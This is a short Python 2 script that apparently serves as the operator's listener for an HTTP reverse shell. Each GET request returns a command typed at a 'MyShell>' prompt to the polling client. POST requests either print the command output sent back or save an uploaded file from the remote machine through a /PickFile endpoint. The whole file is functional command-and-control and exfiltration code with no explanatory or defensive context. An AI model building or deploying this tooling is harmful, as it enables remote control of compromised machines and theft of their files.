import BaseHTTPServer
import cgi
import os

hostName = '10.110.151.46'
portNumber = 80


class BasicHttpHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    def do_GET(s):

        cmd = raw_input("MyShell> ")
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        s.wfile.write(cmd)


    def do_POST(s):

        if s.path == '/PickFile':
            
            try:
                myContent, myDic = cgi.parse_header(s.headers.getheader('content-type'))

                if myContent == 'multipart/form-data' :
                    
                    copyFile = cgi.FieldStorage (fp = s.rfile,
                                                 headers = s.headers,
                                                 environ = {'REQUEST_METHOD': 'POST'}
                                                 )

                else:
                    print "Invalid POST request. Check your HTTP method."

                getFile = copyFile['file']


                with open ('/root/Desktop/myFile.txt', 'wb') as op:

                    op.write(getFile.file.read())
                    s.send_response(200)
                    s.end_headers()
                    print 'File transferred!'
            except Exception as ex:
                print ex

            return



        s.send_response(200)
        s.end_headers()
        dataLength = int(s.headers['Content-Length'])
        var = s.rfile.read(dataLength)
        print var

        

if __name__ == '__main__':

    serverClass = BaseHTTPServer.HTTPServer
    httpObject = serverClass((hostName, portNumber), BasicHttpHandler)

    try:
        httpObject.serve_forever()
    except KeyboardInterrupt:

            print 'Server Terminated!'
            httpObject.server_close()
